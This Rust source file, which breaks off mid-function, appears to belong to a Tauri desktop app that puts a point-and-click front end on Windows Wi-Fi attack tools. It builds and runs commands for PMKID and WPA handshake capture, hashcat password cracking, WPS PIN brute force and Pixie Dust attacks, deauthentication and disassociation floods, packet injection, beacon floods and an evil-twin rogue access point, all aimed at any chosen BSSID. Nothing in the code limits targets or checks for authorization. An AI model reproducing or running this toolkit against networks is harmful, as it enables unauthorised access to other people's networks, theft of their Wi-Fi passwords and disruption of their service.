use serde::Serialize;
use tauri::{command, AppHandle};
use tauri_plugin_shell::process::Output;
use tauri_plugin_shell::ShellExt;

// ═══════════════════════════════════════════════════════════════════════════════
// PATHS
// ═══════════════════════════════════════════════════════════════════════════════
fn tool_path(var: &str, fallback: &str) -> std::path::PathBuf {
    std::env::var(var).unwrap_or_else(|_| fallback.to_string()).into()
}

// ═══════════════════════════════════════════════════════════════════════════════
// MODELOS
// ═══════════════════════════════════════════════════════════════════════════════

#[derive(Debug, Clone, Serialize)]
pub struct WifiNetwork {
    pub ssid:     String,
    pub bssid:    Option<String>,
    pub signal:   Option<u8>,
    pub channel:  Option<u8>,
    pub security: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct ScanResult {
    pub networks: Vec<WifiNetwork>,
    pub error:    Option<String>,
}
impl ScanResult {
    fn ok(nets: Vec<WifiNetwork>) -> Self { Self { networks: nets, error: None } }
    fn err(msg: &str) -> Self { Self { networks: vec![], error: Some(msg.into()) } }
}

#[derive(Debug, Clone, Serialize)]
pub struct CmdResponse {
    pub success:    bool,
    pub output:     String,
    pub stderr:     String,
    pub exit_code:  Option<i32>,
}

macro_rules! re {
    ($re:expr) => { once_cell::sync::Lazy::new(|| regex::Regex::new($re).unwrap()) };
}
static RE_SSID:   once_cell::sync::Lazy<regex::Regex> = re!(r"^SSID\s+\d+\s*:\s*(.*)");
static RE_NEW_ID: once_cell::sync::Lazy<regex::Regex> = re!(r"^SSID\s+\d+\s*:");
static RE_BSSID:  once_cell::sync::Lazy<regex::Regex> = re!(r"^BSSID\s+\d*\s*:\s*([0-9A-Fa-f:]{17})");
static RE_SIG:    once_cell::sync::Lazy<regex::Regex> = re!(r"(?:Signal|Señal)\s*:\s*(\d+)%");
static RE_CHAN:   once_cell::sync::Lazy<regex::Regex> = re!(r"(?:Channel|Canal)\s*:\s*(\d+)");
static RE_SEC:    once_cell::sync::Lazy<regex::Regex> =
    re!(r"(?:Authentication|Seguridad|Autenticaci[oó]n|Tipo de autenticaci[oó]n)\s*:\s*(.*)");

// ═══════════════════════════════════════════════════════════════════════════════
// PARSEADOR NETSH
// ═══════════════════════════════════════════════════════════════════════════════

fn parse_netsh(raw: &str) -> Vec<WifiNetwork> {
    let mut nets = vec![];
    let mut lines = raw.lines().peekable();

    while let Some(line) = lines.next() {
        let caps = match RE_SSID.captures(line.trim()) {
            Some(c) => c, None => continue,
        };
        let mut ssid     = caps[1].trim().to_string();
        let mut bssid    = None;
        let mut signal   = None;
        let mut channel  = None;
        let mut security = String::from("Abierta");

        'block: while let Some(sub) = lines.peek() {
            let s = sub.trim();
            if RE_NEW_ID.is_match(s) { break 'block; }
            lines.next();
            if let Some(c) = RE_BSSID.captures(s) { bssid = Some(c[1].to_uppercase()); }
            else if let Some(c) = RE_SIG.captures(s) { if let Ok(n) = c[1].parse() { signal = Some(n); } }
            else if let Some(c) = RE_CHAN.captures(s) { if let Ok(n) = c[1].parse() { channel = Some(n); } }
            else if let Some(c) = RE_SEC.captures(s) {
                let sec = c[1].trim();
                if !sec.is_empty() { security = sec.to_string(); }
            }
        }
        if ssid.is_empty() && bssid.is_some() { ssid = "Red oculta".into(); }
        nets.push(WifiNetwork { ssid, bssid, signal, channel, security });
    }
    nets
}

// ═══════════════════════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════════════════════

async fn run_bin(app: &AppHandle, exe: &str, args: &[String]) -> CmdResponse {
    let shell = app.shell();
    let arg_refs: Vec<&str> = args.iter().map(|s| s.as_ref()).collect();
    match shell.command(exe).args(&arg_refs).output().await {
        Ok(data) => CmdResponse {
            success:   data.status.success(),
            output:    String::from_utf8_lossy(&data.stdout).into_owned(),
            stderr:    String::from_utf8_lossy(&data.stderr).into_owned(),
            exit_code: data.status.code(),
        },
        Err(e) => CmdResponse {
            success: false, output: String::new(),
            stderr: e.to_string(), exit_code: None,
        },
    }
}

fn wrap(title: &str, body: &str, ok: bool) -> String {
    let icon = if ok { "\u{2705}" } else { "\u{274C}" };
    format!("{} {}\n{}", icon, title, body)
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 1 — ESCANEAR
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn scan_wifi(app: AppHandle) -> ScanResult {
    use std::time::Duration;
    let shell = app.shell();
    let out: Output = match tokio::time::timeout(Duration::from_secs(10),
        shell.command("powershell")
            .args(["-NoProfile", "-Command", "netsh wlan show networks mode=bssid"])
            .output()
    ).await {
        Ok(Ok(o)) => o,
        Ok(Err(e)) => return ScanResult::err(&e.to_string()),
        Err(_) => return ScanResult::err("Timeout: netsh wlan tardó más de 10s."),
    };
    ScanResult::ok(parse_netsh(&String::from_utf8_lossy(&out.stdout)))
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 2 — CAPTURAR PMKID  (hcxdumptool)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn pmkid_capture(app: AppHandle, bssid: String, channel: Option<u8>, duration_seconds: Option<u64>) -> CmdResponse {
    let prog  = tool_path("HCXDUMPTOOL_PATH", "hcxdumptool.exe");
    let ch    = channel.unwrap_or(1);
    let dur   = duration_seconds.unwrap_or(120);
    let outfile = format!("capture_{}.pcapng", bssid.replace(':', ""));
    let mut args = vec![
        "--fcs".into(), "--enable_status=1".into(), "--status_interval=5000".into(),
        "-i".into(),
        "-t".into(), dur.to_string(),
        "-w".into(), outfile.clone(),
        "--bssid".into(), bssid.clone(),
    ];
    if ch > 0 { args.push("--channel".into()); args.push(ch.to_string()); }
    let r = run_bin(&app, prog.to_str().unwrap_or("hcxdumptool.exe"), &args).await;
    let body = format!("Binario: {}\nArchivo: {}\n\n{}", prog.display(), outfile, r.output);
    CmdResponse { success: r.success, output: wrap(&format!("PMKID Capture · {} · Canal={} · {}s", bssid, ch, dur), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 3 — CONVERTIR PMKID -> HASH  (hcxpcapngtool)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn pmkid_convert(_app: AppHandle, pcapng_path: String, output_dir: Option<String>) -> CmdResponse {
    let prog    = tool_path("HCXPCAPNGTOOL_PATH", "hcxpcapngtool.exe");
    let out_dir = output_dir.as_deref().unwrap_or(".");
    let stem    = std::path::Path::new(&pcapng_path).file_stem().and_then(|s| s.to_str()).unwrap_or("out");
    let hash_file = format!("{}/{}.22000", out_dir, stem);
    let args = vec!["-o".into(), hash_file.clone(), pcapng_path.clone()];
    let r    = run_bin(&_app, prog.to_str().unwrap_or("hcxpcapngtool.exe"), &args).await;
    let body = format!("Input: {}\nOutput: {}\n\n{}", pcapng_path, hash_file, r.output);
    CmdResponse { success: r.success, output: wrap(&format!("PMKID Convert · {pcapng_path}"), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 4 — CRACK PMKID  (hashcat)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn pmkid_crack(app: AppHandle, hash_file: String, wordlist: Option<String>, attack_mode: Option<u8>) -> CmdResponse {
    let prog     = tool_path("HASHCAT_PATH", "hashcat.exe");
    let wordlist_bin = wordlist.clone().unwrap_or_else(|| tool_path("WORDLIST_PATH", "wordlist.txt").to_string_lossy().into_owned());
    let mode     = attack_mode.unwrap_or(0);
    let cracked_out = format!("{}.cracked", hash_file);
    let args = vec![
        "-m".into(), "16800".into(),
        "-a".into(), mode.to_string(),
        "-o".into(), cracked_out.clone(),
        "--force".into(),
        hash_file.clone(),
        wordlist_bin.clone(),
    ];
    let r = run_bin(&app, prog.to_str().unwrap_or("hashcat.exe"), &args).await;
    let pw_opt   = r.output.lines().find(|l| l.contains(':')).map(|s| s.to_string());
    let body = if let Some(ref p) = pw_opt {
        format!("\u{1F512} PASSWORD: {}\n\n{}", p, r.output)
    } else {
        format!("Sin resultado aun. Hash: {}\nModo: {}  Wordlist: {}\n\n{}", hash_file, mode, wordlist_bin, r.output)
    };
    CmdResponse { success: pw_opt.is_some() || r.success, output: wrap(&format!("PMKID Crack \u{00B7} {hash_file}"), &body, pw_opt.is_some()), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 5 — WPS PIN BRUTEFORCE  (bully)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn wps_pin_bruteforce(app: AppHandle, bssid: String, interface: String) -> CmdResponse {
    let prog = tool_path("BULLY_PATH", "bully.exe");
    let args = vec!["-b".into(), bssid.clone(), interface.clone()];
    let r    = run_bin(&app, prog.to_str().unwrap_or("bully.exe"), &args).await;
    let summary = if r.output.to_lowercase().contains("pin:") {
        let pins: Vec<_> = r.output.lines().filter(|l| l.to_lowercase().contains("pin:")).collect();
        let psks: Vec<_> = r.output.lines().filter(|l| l.to_lowercase().contains("psk:")).collect();
        let mut s = format!("PIN encontrado:\n{}", pins.join("\n"));
        if !psks.is_empty() { s.push_str(&format!("\nPSK encontrada:\n{}", psks.join("\n"))); }
        s
    } else {
        "bully ejecutado. Revisa la salida para el progreso del PIN.".into()
    };
    CmdResponse {
        success:    false,
        output:     wrap(&format!("WPS Bruteforce \u{00B7} {} \u{00B7} {interface}", bssid), &summary, false),
        stderr:     r.stderr,
        exit_code:  r.exit_code,
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 6 — SCAN AIRODUMP  (airodump-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn scan_airodump(app: AppHandle, bssid_filter: Option<String>, channel_filter: Option<u8>, duration_secs: Option<u64>) -> CmdResponse {
    let prog = tool_path("AIRODUMP_PATH", "airodump-ng.exe");
    let ch   = channel_filter.unwrap_or(0);
    let dur  = duration_secs.unwrap_or(60);
    let mut args = vec![
        "--write-interval".into(), "1000".into(),
        "--output-format".into(), "csv".into(),
    ];
    if ch > 0 { args.push("--channel".into()); args.push(ch.to_string()); }
    if let Some(ref b) = bssid_filter { args.push("--bssid".into()); args.push(b.clone()); }
    args.push("wlan0mon".into());
    let r = run_bin(&app, prog.to_str().unwrap_or("airodump-ng.exe"), &args).await;
    let body = format!("Binario: {}\nCanal: {}  Duracion: {}s\n\n{}", prog.display(), if ch > 0 { ch.to_string() } else { "todos".into() }, dur, r.output);
    CmdResponse { success: r.success, output: wrap("AIRODUMP Scan", &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}


// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 7 — ESTADO DE INTERFAZ WiFi
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn wifi_interface_status(_app: AppHandle) -> CmdResponse {
    let shell = _app.shell();
    let ps = "Get-NetAdapter | Where-Object {$_.MediaType -eq 'Native 802.11'} | Format-Table -AutoSize";
    let out = match shell.command("powershell").args(["-NoProfile", "-Command", ps]).output().await { Ok(o) => o, Err(e) => return CmdResponse { success: false, output: String::new(), stderr: e.to_string(), exit_code: None } };
    CmdResponse { success: out.status.success(), output: String::from_utf8_lossy(&out.stdout).into_owned(), stderr: String::from_utf8_lossy(&out.stderr).into_owned(), exit_code: out.status.code() }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 8 — LISTAR PROCESOS DE ATAQUE
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn list_attack_processes(_app: AppHandle) -> CmdResponse {
    let shell = _app.shell();
    let ps = "Get-Process -ErrorAction SilentlyContinue | Where-Object {$_.ProcessName -match 'hcxdumptool|hashcat|bully|reaver'} | Format-Table Id, ProcessName, Path -AutoSize";
    let out = match shell.command("powershell").args(["-NoProfile", "-Command", ps]).output().await { Ok(o) => o, Err(e) => return CmdResponse { success: false, output: String::new(), stderr: e.to_string(), exit_code: None } };
    CmdResponse { success: true, output: String::from_utf8_lossy(&out.stdout).into_owned(), stderr: String::new(), exit_code: out.status.code() }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 9 — MATAR PROCESO DE ATAQUE
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn kill_attack_process(_app: AppHandle, pid: u32) -> CmdResponse {
    let shell = _app.shell();
    let cmd   = format!("taskkill /PID {} /F /T", pid);
    let out   = match shell.command("powershell").args(["-NoProfile", "-Command", &cmd]).output().await { Ok(o) => o, Err(e) => return CmdResponse { success: false, output: String::new(), stderr: e.to_string(), exit_code: None } };
    CmdResponse { success: out.status.success(), output: String::from_utf8_lossy(&out.stdout).into_owned(), stderr: String::from_utf8_lossy(&out.stderr).into_owned(), exit_code: out.status.code() }
}


// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 10 — CAPTURAR HANDSHAKE WPA/WPA2 (EAPOL 4-way)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn capture_handshake(app: AppHandle, bssid: String, essid: Option<String>, channel: Option<u8>, duration_seconds: Option<u64>) -> CmdResponse {
    let dur  = duration_seconds.unwrap_or(60);
    let ch   = channel.unwrap_or(1);
    let bssid_clean = bssid.replace(':', "");
    let pcap  = format!("handshake_{}.pcapng", bssid_clean);
    let hccapx = format!("handshake_{}.hccapx", bssid_clean);
    let mut args = vec![
        "--fcs".into(), "--enable_status=1".into(), "--status_interval=5000".into(),
        "-i".into(), "-t".into(), dur.to_string(),
        "-w".into(), pcap.clone(),
        "--bssid".into(), bssid.clone(),
        "--channel".into(), ch.to_string(),
    ];
    if let Some(ref e) = essid { args.push("--essid".into()); args.push(e.clone()); }
    let prog  = tool_path("HCXDUMPTOOL_PATH", "hcxdumptool.exe");
    let cap  = run_bin(&app, prog.to_str().unwrap_or("hcxdumptool.exe"), &args).await;
    let conv = if cap.success {
        let prog2 = tool_path("HCXPCAPNGTOOL_PATH", "hcxpcapngtool.exe");
        let c_args = vec!["-k".into(), "-o".into(), hccapx.clone(), pcap.clone()];
        run_bin(&app, prog2.to_str().unwrap_or("hcxpcapngtool.exe"), &c_args).await
    } else { CmdResponse { success: false, output: cap.output.clone(), stderr: cap.stderr.clone(), exit_code: cap.exit_code } };
    let body = format!("Paso 1 — Captura:\n{}\n\nPaso 2 — Extraccion EAPOL:\n{}\nArchivo: {}", cap.output, conv.output, hccapx);
    let ok = conv.success;
    CmdResponse { success: ok, output: wrap(&format!("Handshake Capture · {} · Canal={} · {}s", bssid, ch, dur), &body, ok), stderr: format!("{}\n{}", cap.stderr, conv.stderr), exit_code: conv.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 11 — CRACK HANDSHAKE WPA/WPA2 (hashcat modo 22000)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn crack_handshake(app: AppHandle, hash_file: String, wordlist: Option<String>, attack_mode: Option<u8>, session_name: Option<String>) -> CmdResponse {
    let prog          = tool_path("HASHCAT_PATH", "hashcat.exe");
    let wordlist_bin  = wordlist.clone().unwrap_or_else(|| tool_path("WORDLIST_PATH", "wordlist.txt").to_string_lossy().into_owned());
    let mode_str      = "22000";
    let atk           = attack_mode.unwrap_or(0);
    let cracked_out   = format!("{}.cracked", hash_file);
    let args: Vec<String> = vec![
        "-m".into(), mode_str.into(), "-a".into(), atk.to_string(),
        "-o".into(), cracked_out.clone(), "--force".into(),
        "--status".into(), "--status-timer=10".into(),
        "--session".into(), session_name.clone().unwrap_or_else(|| "uifipill".into()),
        hash_file.clone(), wordlist_bin.clone(),
    ];
    let r = run_bin(&app, prog.to_str().unwrap_or("hashcat.exe"), &args).await;
    let pw_opt = r.output.lines().find(|l| l.contains(':') && !l.starts_with('#')).map(|s| s.to_string());
    let body   = if let Some(ref p) = pw_opt {
        format!("\u{1F512} PASSWORD CRACKEADA:\n{}\n\n{}", p, r.output)
    } else {
        format!("Sin resultado aun.\nHash: {}\nModo: {}  Ataque: {}  Wordlist: {}\n\n{}", hash_file, mode_str, atk, wordlist_bin, r.output)
    };
    let ok = pw_opt.is_some();
    CmdResponse { success: ok, output: wrap(&format!("Handshake Crack \u{00B7} {hash_file} \u{00B7} -a{atk}"), &body, ok), stderr: r.stderr, exit_code: r.exit_code }
}


// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 12 — DEAUTH INJECTION  (aireplay-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn deauth_inject(app: AppHandle, bssid: String, client_mac: Option<String>, count: Option<u8>, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
    let cnt  = count.unwrap_or(10);
    let iface_in  = iface.unwrap_or_else(|| "wlan0mon".into());
    let mut args = vec!["--deauth".into(), cnt.to_string(), "-a".into(), bssid.clone()];
    if let Some(ref c) = client_mac { args.push("-c".into()); args.push(c.clone()); }
    args.push(iface_in.clone());
    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
    let body = format!("Binario: {}\nBSSID: {}\nClientes: {}\nPaquetes: {}\nInterface: {}\n\n{}", prog.display(), bssid, client_mac.as_deref().unwrap_or("broadcast"), cnt, iface_in, r.output);
    CmdResponse { success: r.success, output: wrap(&format!("Deauth · {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 13 — DISASSOC INJECTION  (aireplay-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn disassoc_inject(app: AppHandle, bssid: String, client_mac: Option<String>, count: Option<u8>, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
    let cnt  = count.unwrap_or(5);
    let iface_in  = iface.unwrap_or_else(|| "wlan0mon".into());
    let mut args = vec!["--disassociate".into(), cnt.to_string(), "-a".into(), bssid.clone()];
    if let Some(ref c) = client_mac { args.push("-c".into()); args.push(c.clone()); }
    args.push(iface_in.clone());
    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
    let body = format!("Binario: {}\nBSSID: {}\nClientes: {}\nPaquetes: {}\nInterface: {}\n\n{}", prog.display(), bssid, client_mac.as_deref().unwrap_or("broadcast"), cnt, iface_in, r.output);
    CmdResponse { success: r.success, output: wrap(&format!("Disassoc · {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 14 — ARP REPLAY INJECT  (aireplay-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn arp_replay_inject(app: AppHandle, target_bssid: String, address: Option<String>, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
    let iface_in = iface.unwrap_or_else(|| "wlan0mon".into());
    let addr     = address.unwrap_or_else(|| "ff:ff:ff:ff:ff:ff".into());
    let args = vec!["--arpreply".into(), "-b".into(), target_bssid.clone(), "-h".into(), addr.clone(), iface_in.clone()];
    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
    let body = format!("Binario: {}\nBSSID: {}\nMAC fake: {}\nInterface: {}\n\n{}", prog.display(), target_bssid, addr, iface_in, r.output);
    CmdResponse { success: r.success, output: wrap(&format!("ARP Replay · {}", target_bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}


// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 15 — BEACON FLOOD  (mdk3 Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn beacon_flood(app: AppHandle, essid: String, bssid: Option<String>, channel: Option<u8>, beacon_count: Option<u32>) -> CmdResponse {
    let prog  = tool_path("MDK3_PATH", "mdk3.exe");
    let bssid = bssid.unwrap_or_else(|| "00:11:22:33:44:55".into());
    let ch    = channel.unwrap_or(1).to_string();
    let cnt   = beacon_count.unwrap_or(50);
    let mut args = vec!["wlan0mon".into(), "b".into(), "-c".into(), ch.clone(), "-n".into(), essid.clone(), "-s".into(), cnt.to_string()];
    args.push("-a".into()); args.push(bssid.clone());
    let r = run_bin(&app, prog.to_str().unwrap_or("mdk3.exe"), &args).await;
    let body = format!("Binario: {}\nESSID: {}\nBSSID: {}\nCanal: {}\nBeacons: {}\n\n{}", prog.display(), essid, bssid, ch, cnt, r.output);
    CmdResponse { success: r.success, output: wrap(&format!("Beacon Flood · {}", essid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 16 — WPS PBC  (reaver-wps push-button mode)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn wps_pbc_attack(app: AppHandle, bssid: String, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("REAVER_PATH", "reaver-wps-fork-t6x.exe");
    let iface_in  = iface.unwrap_or_else(|| "wlan0".into());
    let args = vec!["-i".into(), iface_in.clone(), "-b".into(), bssid.clone(), "-S".into(), "-vv".into(), "-L".into()];
    let r = run_bin(&app, prog.to_str().unwrap_or("reaver-wps-fork-t6x.exe"), &args).await;
    let body = format!("Binario: {}\nBSSID: {}\nInterface: {}\nModo: WPS PBC (-S)\n\n{}", prog.display(), bssid, iface_in, r.output);
    CmdResponse { success: r.success, output: wrap(&format!("WPS PBC · {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 17 — CHOPCHOP INJECT  (aireplay-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn chopchop_inject(app: AppHandle, target_bssid: String, source_mac: Option<String>, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
    let iface_in  = iface.unwrap_or_else(|| "wlan0mon".into());
    let src_mac   = source_mac.unwrap_or_else(|| "00:11:22:33:44:55".into());
    let out_file = format!("chopchop_{}.xor", target_bssid.replace(':', ""));
    let args = vec!["--chopchop".into(), "-b".into(), target_bssid.clone(), "-h".into(), src_mac.clone(), "-F".into(), out_file.clone(), iface_in.clone()];
    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
    let body = format!("Binario: {}\nBSSID: {}\nMAC origen: {}\nInterface: {}\nSalida: {}\n\n{}", prog.display(), target_bssid, src_mac, iface_in, out_file, r.output);
    CmdResponse { success: r.success, output: wrap(&format!("ChopChop · {}", target_bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 18 — EVIL TWIN / ROGUE AP  (airbase-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn rogue_ap(app: AppHandle, essid: String, bssid: Option<String>, channel: Option<u8>, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRBASE_PATH", "airbase-ng.exe");
    let iface_in  = iface.unwrap_or_else(|| "wlan0mon".into());
    let bssid_val = bssid.unwrap_or_else(|| "00:11:22:33:44:55".into());
    let ch        = channel.unwrap_or(1);
    let args = vec!["--essid".into(), essid.clone(), "-b".into(), bssid_val.clone(), "-c".into(), ch.to_string(), "-W".into(), "2".into(), iface_in.clone()];
    let r = run_bin(&app, prog.to_str().unwrap_or("airbase-ng.exe"), &args).await;
    let body = format!("Binario: {}\nESSID: {}\nBSSID: {}\nCanal: {}\nInterface: {}\n\n{}", prog.display(), essid, bssid_val, ch, iface_in, r.output);
    CmdResponse { success: r.success, output: wrap(&format!("Rogue AP \u{00B7} {}", essid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}


// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 19 — INJECTION TEST  (aireplay-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn injection_test(app: AppHandle, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
    let iface_in = iface.unwrap_or_else(|| "wlan0mon".into());
    let args = vec!["--test".into(), iface_in.clone()];
    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
    let body = format!("Binario: {}\nInterface: {}\n\n{}", prog.display(), iface_in, r.output);
    let ok = r.output.contains("injection is working") || r.output.contains("Injection is working");
    CmdResponse { success: r.success || ok, output: wrap(&format!("Injection Test · {}", iface_in), &body, ok), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 20 — FAKEAUTH INJECT  (aireplay-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn fakeauth_inject(app: AppHandle, bssid: String, source_mac: Option<String>, delay: Option<u8>, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
    let src_mac = source_mac.unwrap_or_else(|| "00:11:22:33:44:55".into());
    let dly = delay.unwrap_or(1);
    let iface_in = iface.unwrap_or_else(|| "wlan0mon".into());
    let args = vec!["--fakeauth".into(), dly.to_string(), "-a".into(), bssid.clone(), "-h".into(), src_mac.clone(), iface_in.clone()];
    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
    let body = format!("Binario: {}\nBSSID: {}\nMAC origen: {}\nDelay: {}s\nInterface: {}\n\n{}", prog.display(), bssid, src_mac, dly, iface_in, r.output);
    CmdResponse { success: r.success, output: wrap(&format!("Fakeauth · {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 21 — WPS PIXIE DUST  (reaver-wps -K 1)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn wps_pixiedust(app: AppHandle, bssid: String, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("REAVER_PATH", "reaver-wps-fork-t6x.exe");
    let iface_in = iface.unwrap_or_else(|| "wlan0".into());
    let args = vec!["-i".into(), iface_in.clone(), "-b".into(), bssid.clone(), "-K".into(), "1".into(), "-vv".into(), "-L".into()];
    let r = run_bin(&app, prog.to_str().unwrap_or("reaver-wps-fork-t6x.exe"), &args).await;
    let body = format!("Binario: {}\nBSSID: {}\nInterface: {}\nModo: Pixie Dust (-K 1)\n\n{}", prog.display(), bssid, iface_in, r.output);
    let ok = r.output.contains("WPS PIN:") || r.output.contains("Pin:");
    CmdResponse { success: ok || r.success, output: wrap(&format!("WPS Pixie Dust · {}", bssid), &body, ok), stderr: r.stderr, exit_code: r.exit_code }
}


// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 22 — CAFÉ LATTE ATTACK  (aireplay-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn cafe_latte_attack(app: AppHandle, bssid: String, client_mac: Option<String>, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
    let mac = client_mac.unwrap_or_else(|| "ff:ff:ff:ff:ff:ff".into());
    let iface_in = iface.unwrap_or_else(|| "wlan0mon".into());
    let args = vec!["--cafe-latte".into(), "-a".into(), bssid.clone(), "-h".into(), mac.clone(), iface_in.clone()];
    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
    let body = format!("Binario: {}\nBSSID: {}\nMAC cliente: {}\nInterface: {}\n\n{}", prog.display(), bssid, mac, iface_in, r.output);
    CmdResponse { success: r.success, output: wrap(&format!("Café Latte · {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 23 — INTERACTIVE INJECT  (aireplay-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn interactive_inject(app: AppHandle, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
    let iface_in = iface.unwrap_or_else(|| "wlan0mon".into());
    let args = vec!["--interactive".into(), iface_in.clone()];
    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
    let body = format!("Binario: {}\nInterface: {}\n\n{}", prog.display(), iface_in, r.output);
    CmdResponse { success: r.success, output: wrap(&format!("Interactive Inject · {}", iface_in), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 24 — FRAGMENT INJECT  (aireplay-ng Windows nativo)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn fragment_inject(app: AppHandle, bssid: String, source_mac: Option<String>, iface: Option<String>) -> CmdResponse {
    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
    let src_mac = source_mac.unwrap_or_else(|| "00:11:22:33:44:55".into());
    let iface_in = iface.unwrap_or_else(|| "wlan0mon".into());
    let args = vec!["--fragment".into(), "-a".into(), bssid.clone(), "-h".into(), src_mac.clone(), iface_in.clone()];
    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
    let body = format!("Binario: {}\nBSSID: {}\nMAC origen: {}\nInterface: {}\n\n{}", prog.display(), bssid, src_mac, iface_in, r.output);
    CmdResponse { success: r.success, output: wrap(&format!("Fragment Inject · {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}


// ═══════════════════════════════════════════════════════════════════════════════
// COMANDOS BACKGROUND + CANCELACIÓN
// ═══════════════════════════════════════════════════════════════════════════════

use crate::AppState;
use tauri::{State, Emitter as _};
use tauri_plugin_shell::process::CommandEvent;

/// Helper: lanza un binario en background y guarda el child en el mapa de ataques
async fn run_bin_bg(app: &AppHandle, state: &State<'_, AppState>, attack_id: &str, exe: &str, args: &[String]) -> CmdResponse {
    let shell = app.shell();
    let arg_refs: Vec<&str> = args.iter().map(|s| s.as_ref()).collect();
